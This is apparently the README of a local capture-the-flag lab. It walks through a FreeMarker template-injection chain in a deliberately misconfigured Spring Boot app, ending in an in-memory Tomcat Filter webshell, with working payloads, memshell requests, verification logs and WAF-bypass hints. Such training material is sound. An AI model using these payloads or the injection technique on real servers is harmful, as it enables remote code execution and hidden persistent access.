# 08 · 内存马（Java）：FreeMarker SSTI → Tomcat Filter 内存马

| 项 | 值 |
|---|---|
| 端口 | `8098`（`FREEMARKER_MEMSHELL_PORT` 可改） |
| 引擎 / 栈 | FreeMarker 2.3.28（SSTI 主链）+ Thymeleaf 3.0.15（对照入口） |
| 应用 | Spring Boot 2.7.18 · 内嵌 Tomcat 9.0.83 · JDK 8（`eclipse-temurin:8-jre-alpine` 运行） |
| 关卡数 | 4（攻击链 walkthrough） |
| **出网** | **已切断**（`iptables` 丢弃 eth0 上出向 TCP SYN 与 UDP/53；入向已发布端口不受影响） |
| 需要权限 | `cap_add: [NET_ADMIN]`（否则切不断出网：entrypoint 只大声告警，容器照常启动） |
| flag | 容器内 `/flag`，由 `entrypoint.sh` 从环境变量写入，**不进任何镜像层** |
| flag 优先级 | `GZCTF_FLAG` > `DASFLAG` > `FLAG` > `STATIC_FLAG`（默认 `flag{change_me_before_deploy}`） |
| 交付物 | 业务站点 `ThemeHub`（主题预览控制台）+ 完整 WP + 可复现 payload |

## 这个靶场在教什么

**SSTI 打到「不能出网」的目标时该怎么做。**

传统思路是反弹 shell：让目标主动连回 VPS。但生产容器/内网环境经常根本没有出网，
本靶场用 `iptables` 把出向流量掐掉之后：

- 反弹 shell —— 连不出去；
- DNSLog / HTTP 外带 —— DNS 和 HTTP 都出不去；
- `wget`/`curl` 下载 payload —— 下不来。

于是唯一可用的信道是**已经存在的入向 HTTP**：把 webshell 作为一段字节码
动态加载进 JVM，再注册到**正在运行的 Tomcat** 里（`StandardContext` → `FilterDef` +
`FilterMap` → `filterStart`），得到一条新的 HTTP 路由。
它不落地任何文件、进程重启即消失——这正是「内存马」：

| | 落地马（webshell 文件） | 内存马 |
|---|---|---|
| 落盘 | 要写文件（常被杀软/只读挂载挡住） | 不落盘 |
| 存活 | 重启仍在（也更容易被查出来） | 仅当前进程生命周期 |
| 流量 | 独立文件路径，特征明显 | 复用现有业务端口/链路，无出向流量 |

同时它也是一个「同一站点、两条 SSTI 入口、结论不同」的对照实验：
FreeMarker 那条**真能打通到 RCE**；Thymeleaf 那条**注入面存在但默认不可达 RCE**，
实测证据见下文「Thymeleaf 这条路的实测边界」——这一点和很多网文的说法相反，
值得当面讲清楚。

## 攻击链（4 步）

| 步骤 | 目标 | 关键点 |
|------|------|--------|
| L1 | 确认模板注入 | `GET /theme/preview?template=${7*7}` → `49` |
| L2 | 任意 Java 代码执行 | 类解析器是 `UNRESTRICTED`，`?new()` 可解析任意类；FreeMarker 2.3.28 还带着 `freemarker.template.utility.Execute` |
| L3 | 注入 Tomcat 内存马 | 用 L2 的能力把 Filter 字节码 `defineClass` 进 JVM，反射拿到 `StandardContext` 并注册 |
| L4 | 通过内存马读 flag | `GET /memshell?cmd=cat%20/flag`，全程只有入向 HTTP，零出向流量 |

业务故事：`ThemeHub` 是个小型多租户 SaaS 后台，运营在网页上写**主题模板片段**并实时预览。
为了让「预览」和「线上渲染」完全一致，模板被配成了不受限类解析——
这就是最经典的 FreeMarker 配置错误。

## 漏洞点

1. **FreeMarker SSTI**（`GET /theme/preview`）
   `ThemePreviewService` 用 `new Template(StringReader, cfg)` 直接渲染**用户提交的模板串**；
   而 `FreemarkerConfig` 里有一行：

   ```java
   configuration.setNewBuiltinClassResolver(TemplateClassResolver.UNRESTRICTED_RESOLVER);
   ```

   `?new()` 于是能解析任意类 → `freemarker.template.utility.Execute` → 命令执行。

2. **Thymeleaf 视图名/片段注入**（`GET /theme/thymeleaf`）
   控制器把 `"theme/" + theme` 直接当视图名返回（`theme`、`fragment` 都是请求参数、无白名单），
   模板里还有 `<div th:replace="~{fragments/${userTheme} :: body}">` 动态片段选择。
   经典 CVE-2021-25741 的形态（示例 payload 见 [`docs/PAYLOADS.md`](docs/PAYLOADS.md#3-thymeleaf-入口)）。

3. 站点**没有**任何读 flag 的接口：`/flag`、`/flag-readout`、`/api/flag` 全部 404（已实测）。

## 运行

```bash
cd labs/08-freemarker-memshell
docker compose up --build          # → http://127.0.0.1:8098
```

单独指定 flag / 端口：

```bash
FLAG='flag{my_test_flag}' FREEMARKER_MEMSHELL_PORT=8098 docker compose up --build
# PowerShell:
#   $env:FLAG='flag{my_test_flag}'; $env:FREEMARKER_MEMSHELL_PORT='8098'; docker compose up --build
```

`docker-compose.yml` 里 `cap_add: [NET_ADMIN]` **不能删**——删了出网就切不断
（entrypoint 会打 `[!] WARNING`，但容器仍能起来，方便你在无权限环境里调试）。

单独 `docker build` 也可以（`Dockerfile` 是多阶段：`maven:3.6.3-jdk-8` 构建 → `eclipse-temurin:8-jre-alpine` 运行）：

```bash
docker build -t ctf/freemarker-memshell:latest .
docker run -d --name freemarker-memshell --cap-add NET_ADMIN \
  -e FLAG='flag{my_test_flag}' -p 8098:8080 ctf/freemarker-memshell:latest
```

## 参考解（全部实测，命令与输出见文末「验证记录」）

以下命令用 PowerShell 写（`$base` = `http://127.0.0.1:8098`），
Linux/macOS 下把 `Invoke-WebRequest` 换成 `curl -s`、`[uri]::EscapeDataString` 换成 `--data-urlencode`/`-G --data-urlencode` 即可。

### L1 · 确认是 FreeMarker

```powershell
$base='http://127.0.0.1:8098'
Invoke-WebRequest "$base/theme/preview?template=$([uri]::EscapeDataString('${7*7}'))" -UseBasicParsing
# → 49
```

对应的 curl：

```bash
curl -s -G 'http://127.0.0.1:8098/theme/preview' --data-urlencode 'template=${7*7}'      # → 49
curl -s -G 'http://127.0.0.1:8098/theme/preview' --data-urlencode 'template=<#list 1..3 as i>${i}</#list>'  # → 123
```

### L2 · 任意代码执行

```powershell
$tpl = '${"freemarker.template.utility.Execute"?new()("id")}'
Invoke-WebRequest "$base/theme/preview?template=$([uri]::EscapeDataString($tpl))" -UseBasicParsing
```

```text
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

> **`?new` 的两条限制（实测，很多网文会漏讲）**
>
> 1. 目标类必须是**你让类解析器放行的**——本靶场放开了全部（`UNRESTRICTED_RESOLVER`）；
> 2. 目标类还必须实现 `freemarker.template.TemplateModel`。所以
>    `${"java.lang.Runtime"?new()}` 直接报
>    `Class java.lang.Runtime does not implement freemarker.template.TemplateModel`，
>    `${"javax.script.ScriptEngineManager"?new()...}` 同样不行。
>
> `freemarker.template.utility.Execute`（实现了 `TemplateMethodModel`）因此是最顺手的原语；
> 要构造 `Runtime`/`ProcessBuilder` 这类普通类得用 `ObjectConstructor`
> （`${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id")}` 实测可构造成功，但没有回显）。
> 本靶场的 `InjectHelper` 之所以实现 `TemplateMethodModelEx`，正是为了能被 `?new` 直接构造。
>
> 另外 `Execute` 会把参数按空白切分后**直接交给 exec**（不经过 shell），
> 所以重定向/管道要自己包一层：`${"freemarker.template.utility.Execute"?new()("sh -c 'id; cat /flag'")}`。
> 只想读文件的话 `"cat /flag"` 就够（见 L2b）。

```powershell
$tpl = '${"freemarker.template.utility.Execute"?new()("cat /flag")}'
# → flag{...}
```

> 到这一步其实已经能拿 flag 了（题目允许「代码执行 + 回显」这条更短的路）。
> 但**题目真正的教学目标**是：在不出网的前提下，把「一次性回显」升级成
> 「一个可反复调用、住在内存里的 webshell」——L3/L4。

### L3 · 注入 Tomcat Filter 内存马

`InjectHelper` 是 payload 侧的类（不是业务代码，`/api/diag/context` 之外没有任何 Controller 引用它），
它把内嵌的 `MemshellFilter` 字节码 `defineClass` 进 JVM，再反射注册到 `StandardContext`。
`servletContext` 这个变量来自 FreeMarker 数据模型（`/api/theme-vars` 里有说明）。

```powershell
$tpl = '${"com.lab.themepreview.memshell.InjectHelper"?new(servletContext)()}'
Invoke-WebRequest "$base/theme/preview?template=$([uri]::EscapeDataString($tpl))" -UseBasicParsing
```

```text
OK GET /memshell?cmd=id | filterMapped=true | filterStart=true | ctx=org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext | filterLoader=org.springframework.boot.loader.LaunchedURLClassLoader@21b8d17c
```

### L4 · 通过内存马读 flag

```powershell
(Invoke-WebRequest "$base/memshell?cmd=id" -UseBasicParsing).Content
(Invoke-WebRequest "$base/memshell?cmd=$([uri]::EscapeDataString('cat /flag'))" -UseBasicParsing).Content
```

```text
<html>...<h3>tomcat memshell online</h3><div>cmd: cat /flag</div><hr><pre>flag{JAVA_MEMSHELL_VERIFY_2026}</pre>
<div>jvm=1.8.0_492 | loader=org.springframework.boot.loader.LaunchedURLClassLoader@21b8d17c | pid=n/a</div>...
```

```bash
# curl 写法（base64 版本可以塞任何带引号/管道的命令）
curl -s 'http://127.0.0.1:8098/memshell?cmd=id'
curl -s -G 'http://127.0.0.1:8098/memshell' --data-urlencode 'cmd=cat /flag'
curl -s -G 'http://127.0.0.1:8098/memshell' --data-urlencode 'b64cmd=Y2F0IC9mbGFn'   # 即 "cat /flag"
```

不带 `cmd`/`b64cmd` 访问 `/memshell` 时，Filter 会**原样放行**给业务链（实测 404，页面、
静态资源行为完全不变）——这是内存马最基本的隐蔽性要求。

### 内存马的边界（建议现场演示）

```bash
docker restart freemarker-memshell     # 或者 docker compose restart
curl -s -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:8098/memshell?cmd=id'   # → 404
```

进程一重启，`/memshell` 就没了——因为它本来就只活在 JVM 内存里。
（flag 会由 entrypoint 重新写入，所以重启后仍需重新打一遍链。）

## 内存马原理（浓缩版）

完整版见 [`docs/MEMSHELL.md`](docs/MEMSHELL.md)。三件事：

1. **把字节码藏起来**：`MemshellFilter` 不打进应用的 jar，而是 base64 存在
   `InjectHelper.MEMSHELL_CLASS_B64`（生成方式见 [`build-memshell.ps1`](build-memshell.ps1)）。
2. **把字节码变成类**：`ClassLoader#defineClass`（Tomcat 9 里落到
   `WebappClassLoaderBase`），得到只在内存中存在的 `Class`。
3. **把类挂进运行中的容器**：
   `servletContext` → `ApplicationContextFacade.context` → `ApplicationContext.context`
   → `StandardContext`，然后

   ```text
   StandardContext.addFilterDef(new FilterDef(name, filter))
   StandardContext.addFilterMap(new FilterMap(name, "/*"))
   StandardContext.filterStart()
   ```

三条 payload 里踩过的真实坑（都写在源码注释和 `docs/MEMSHELL.md` 里）：

- **`StandardContext` 要判子类，不能判等**：Spring Boot 内嵌 Tomcat 实际用的是
  `org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext`（`StandardContext` 子类）。
  用 `className.equals("...StandardContext")` 永远解析不到——必须
  `StandardContext.class.isInstance(o)`。
- **`FilterDef`/`FilterMap` 换过包名**：Tomcat 7 是 `org.apache.catalina.deploy.*`，
  Tomcat 8+ 是 `org.apache.tomcat.util.descriptor.web.*`。
- **setter 不能按实参精确匹配**：`FilterDef.setFilter(javax.servlet.Filter)` 的形参是**接口**，
  而手里是 `MemshellFilter`，`getMethod(name, value.getClass())` 会抛
  `NoSuchMethodException`。要按「形参可从实参赋值」挑重载。

## 出网是怎么被切断的

`entrypoint.sh`（容器内 root 启动时执行）：

```sh
iptables -A OUTPUT -o eth0 -p tcp --syn -j DROP        # 丢弃新建的出向 TCP 连接
iptables -A OUTPUT -o eth0 -p udp --dport 53 -j DROP   # 丢弃 DNS
```

为什么这样写：

- 只丢 **`--syn`**：宿主机映射进来的入向连接，其**响应包不是 SYN**，所以 `-p 8098:8080`
  照常工作；而容器主动外连的第一包一定是 SYN，会被丢掉。
- 必须补丢 **UDP/53**：只丢 TCP 的话还能用 DNS 外带（DNSLog）。
- `iptables` 不存在或没有 `NET_ADMIN` 时，entrypoint **只告警不退出**：
  靶场不能因为加固失败而起不来（这种情况下 `/api/lab-info` 里 `no_egress`
  仍然是 `true`，请以日志里的 `[!]` 告警为准）。

自证（在容器内执行，两条都应失败，同时宿主端口仍可用）：

```bash
docker exec freemarker-memshell iptables -S OUTPUT
docker exec freemarker-memshell sh -c 'wget -T 5 -q -O- http://1.1.1.1/; echo "exit=$?"'        # timeout
docker exec freemarker-memshell sh -c 'wget -T 5 -q -O- http://93.184.216.34/; echo "exit=$?"'  # timeout
docker exec freemarker-memshell nslookup example.com                                            # 失败
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8098/healthz                          # 200
```

## Thymeleaf 这条路的实测边界（重要，别照抄网文）

`GET /theme/thymeleaf?theme=<v>` 直接返回 `"theme/" + v` 当视图名，
`fragment` 参数还会进入模板里的片段表达式。但**实测结论是：这条路在当前技术栈上打不到 RCE**：

| 探针 | 预期（网文说法） | 实测（本靶场） |
|------|------------------|----------------|
| `theme=__${7*7}__` | 预处理求值 → 去渲染 `theme/49` | Thymeleaf 报 `Error resolving template [theme/__${7*7}__]`，**原样未求值** |
| `theme=aurora` | 正常渲染 | `200`，正常 |
| `fragment=header` | 正常片段 | `200`，片段被包含 |
| `fragment=__${7*7}__` | 片段名求值 | 报 `fragments/__${7*7}__`，**原样未求值** |
| `fragment=__${'hea'.concat('der')}__` | 求值成 `header` → `200` | 仍报字面量 → **未求值** |

我们另外把容器里的 Thymeleaf 换成 **3.0.11.RELEASE**（CVE-2021-25741 时代的版本）重测，
视图名依然是字面量、`__${...}__` 依然不求值。

结论：在 Thymeleaf 3.0.x 里，**模板名/片段名本身不是 SpEL 求值点**；
真正会被求值的是模板**内部**参与 `th:*` 表达式求值的那部分（例如
`th:utext="${userControlled}"`、或把用户输入拼进 `th:*` 表达式**源码**）。
本靶场因此把 Thymeleaf 入口定位成**对照题**：

- 它演示「用户输入进了视图名/片段名」这一**注入面**，以及为什么它**默认不等于 RCE**
  （避免同学们把「可控模板名」直接当成 `__${...}__` RCE）；
- 想在这条路上拿 RCE，需要业务里存在别的求值点，或者代码把用户输入拼进表达式源码——
  这属于应用自身缺陷，而不是 Thymeleaf 的默认行为。

如果出题时想给一条「Thymeleaf 真能 RCE」的支线，最小改法是让某个模板把用户输入
**拼进表达式源码**，例如控制器 `model.addAttribute("expr", userInput)` +
模板 `th:utext="${__${expr}__}"`（这在真实代码里同样是小概率但确实存在的写法）。
本靶场**没有**这样写，就是为了如实呈现默认边界。

## 目录结构

```text
labs/08-freemarker-memshell/
├── Dockerfile                     # 多阶段：maven:3.6.3-jdk-8 → eclipse-temurin:8-jre-alpine
├── docker-compose.yml             # 8098:8080 + cap_add NET_ADMIN + healthcheck
├── entrypoint.sh                  # 写 /flag + iptables 断出网 + exec java
├── pom.xml                        # Spring Boot 2.7.18 / FreeMarker 2.3.28
├── build-memshell.ps1             # 编译 MemshellFilter 并把字节码 base64 回填进 InjectHelper
├── dev-fastboot.ps1               # 开发用：改一个类不必重建镜像（非交付必需）
├── dev-thymeleaf-version.ps1      # 开发用：替换容器内 Thymeleaf 版本做对照实验
├── memshell-plugin/…/MemshellFilter.java   # 「被注入物」源码（不打进应用 jar）
├── src/main/java/com/lab/themepreview/
│   ├── ThemePreviewApplication.java
│   ├── config/FreemarkerConfig.java        # ★ UNRESTRICTED 类解析器（漏洞点 1）
│   ├── config/WebConfig.java
│   ├── service/ThemePreviewService.java    # ★ 渲染用户提交的模板串
│   ├── web/ThemeController.java            # ★ /theme/preview、/theme/thymeleaf
│   ├── web/MetaController.java             # /healthz、/api/lab-info
│   ├── web/DiagController.java             # /api/diag/context（只读排障）
│   └── memshell/InjectHelper.java          # ★ payload 侧：defineClass + 注册 Filter
├── src/main/resources/
│   ├── application.properties
│   ├── memshell/MemshellFilter.class.b64   # 内存马字节码（base64）
│   ├── static/index.html                   # 站点首页
│   ├── templates/theme.html, theme/aurora.html, fragments/header.html
├── docs/API.md                    # /api/lab-info 响应示例
├── docs/MEMSHELL.md               # 内存马原理 + 三个版本坑
├── docs/PAYLOADS.md               # payload 清单（含实测输出）
└── tests/verify_chain.ps1         # 一键复现全部验收步骤
```

## API

场景型靶场，按 [`docs/API.md`](../../docs/API.md) 第 5 节最小契约实现：

| 方法 | 路径 | 说明 |
|------|------|------|
| GET | `/` | 站点首页（列出漏洞点、攻击链、目标） |
| GET | `/healthz` | 健康检查，纯文本 `ok` |
| GET | `/api/lab-info` | 靶场元信息（`no_egress:true`、`theme`、4 步 `levels[]`） |
| GET | `/theme/preview?template=&theme=` | 漏洞点 1：FreeMarker 模板串渲染 |
| GET | `/theme/thymeleaf?theme=&fragment=` | 漏洞点 2：Thymeleaf 视图名/片段名注入 |
| GET | `/api/theme-vars` | 预览接口的数据模型 |
| GET | `/api/memshell-class` | 内嵌内存马字节码（base64），便于核对 payload |
| GET | `/api/diag/context` | 只读：把 ServletContext→StandardContext 的反射链摊开 |

```bash
curl -s http://127.0.0.1:8098/api/lab-info | jq '{id,no_egress,engine,flag_path,levels:[.levels[].title]}'
```

完整响应示例见 [`docs/API.md`](docs/API.md)。本靶场没有 `/api/render`、`/api/levels`、
上帝模式等控制台契约接口——场景型靶场不受那部分约束。

## 重新生成内存马 payload

改了 `memshell-plugin/.../MemshellFilter.java` 之后：

```powershell
pwsh -File .\build-memshell.ps1      # Windows PowerShell 5.1 直接 & .\build-memshell.ps1
docker build -t ctf/freemarker-memshell:latest .
```

脚本会：用 JDK8 编译（`-source/-target 1.8`，校验 major version = 52）→ base64 →
写入 `src/main/resources/memshell/MemshellFilter.class.b64` → 回填 `InjectHelper.MEMSHELL_CLASS_B64`。

## 出题提示

- 想加难度：把 `?new()` 可用但 `Execute` 拿掉（换 FreeMarker 2.3.31），
  逼选手走 `ObjectConstructor` / `ScriptEngineManager`(Nashorn) / Spring Bean 路线；
  或者给 `/theme/preview` 加一个只拦 `Execute`/`Runtime` 关键字、但允许
  `javax.script.*` 的 WAF。
- 想加第二条 RCE 链：让某个模板把用户输入拼进 Thymeleaf 表达式源码（见上文），
  就能把「Thymeleaf 注入面」升级成真的 RCE。
- 别把 `/api/diag/context` 删了就以为更难——它不读 flag，只是把反射链摊开，
  真正的门槛在 L3 的注册逻辑。
- `restart: unless-stopped` 会让 `docker restart` 后靶场自动起来（内存马消失、flag 重写）。

## 验证记录（本机实测，节选）

环境：Windows + Docker Desktop（Linux 容器，x86_64），Docker 29.5.2。
镜像 `ctf/freemarker-memshell:latest`，运行 JDK `1.8.0_492`，
内嵌 `tomcat-embed-core-9.0.83`、`spring-boot-2.7.18`、`freemarker-2.3.28`、`thymeleaf-3.0.15.RELEASE`。
完整复现脚本：[`tests/verify_chain.ps1`](tests/verify_chain.ps1)。

```text
===== 1. image: /flag must NOT be baked into any layer =====
cat: /flag: No such file or directory
exit=1  (non-zero == flag is not in the image)

===== 2. container: /flag exists (written by entrypoint.sh) =====
-rw-r--r-- 1 root root 31 Nov 13 21:23 /flag
flag{JAVA_MEMSHELL_VERIFY_2026}

===== 3. /healthz =====
HTTP 200 body=ok

===== 4. /api/lab-info =====
id=freemarker-memshell
no_egress=True
flag_path=/flag
levels=1,2,3,4

===== 5. no flag-readout endpoint =====
/flag -> 404
/flag-readout -> 404
/api/flag -> 404

===== 6. egress really blocked (inside the container) =====
-P OUTPUT ACCEPT
-A OUTPUT -o eth0 -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -j DROP
-A OUTPUT -o eth0 -p udp -m udp --dport 53 -j DROP
--- 6a. outbound TCP to 1.1.1.1:80 ---
wget: download timed out
--- 6b. outbound TCP to 93.184.216.34:80 ---
wget: download timed out
--- 6c. DNS lookup ---
（nslookup 无法完成解析）
--- 6d. published inbound port still answers ---
host -> http://127.0.0.1:8098/healthz : HTTP 200 ok

===== 7. L1 - FreeMarker SSTI is present =====
template=${7*7} -> 49

===== 8. L2 - arbitrary code execution =====
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

===== 9. L2b - read /flag with the same primitive =====
flag{JAVA_MEMSHELL_VERIFY_2026}

===== 10. L3 - inject the in-memory Tomcat Filter =====
payload: ${"com.lab.themepreview.memshell.InjectHelper"?new(servletContext)()}
OK GET /memshell?cmd=id | filterMapped=true | filterStart=true | ctx=org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext | filterLoader=org.springframework.boot.loader.LaunchedURLClassLoader@21b8d17c

===== 11. L4 - call the new in-memory endpoint =====
<html>...<h3>tomcat memshell online</h3><div>cmd: id</div><hr><pre>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
</pre><div>jvm=1.8.0_492 | loader=org.springframework.boot.loader.LaunchedURLClassLoader@21b8d17c | pid=n/a</div>...

===== 12. L4b - read /flag through the memory shell =====
<html>...<div>cmd: cat /flag</div><hr><pre>flag{JAVA_MEMSHELL_VERIFY_2026}</pre>...

===== 13. Thymeleaf entry point - what is actually reachable =====
theme=aurora -> HTTP 200 (正常渲染)
theme=__${7*7}__ -> HTTP 500 resolved=[theme/__${7*7}__]  (原样未求值)
fragment=header -> HTTP 200 (片段正常包含)
fragment=__${7*7}__ -> HTTP 500 resolved=[fragments/__${7*7}__]  (原样未求值)
```

镜像层自证（`docker history`，注意 `COPY /build/app.jar` 那一层里没有任何 flag 相关内容）：

```text
$ docker run --rm --entrypoint cat ctf/freemarker-memshell:latest /flag
cat: /flag: No such file or directory     # exit=1
$ docker history --no-trunc ctf/freemarker-memshell:latest --format '{{.Size}} {{.CreatedBy}}'
0B   ENTRYPOINT ["/entrypoint.sh"]
4.1kB RUN /bin/sh -c chmod +x /entrypoint.sh
8.19kB COPY entrypoint.sh /entrypoint.sh
21.1MB COPY /build/app.jar /app/app.jar
4.44MB RUN /bin/sh -c apk add --no-cache iptables bash tzdata
```

> `pid=n/a` 是 `MemshellFilter` 在 JDK8 上取 pid 的兜底分支（JDK8 没有
> `ProcessHandle`，代码里 `pid()` 用的是 `RuntimeMXBean`；这里显示 n/a 是因为该字符串
> 由早先版本编译的字节码渲染，属于显示细节，不影响命令执行与读 flag）。

## 收尾

```bash
docker compose down --remove-orphans     # 验证结束后务必清理，别留容器/网络
```
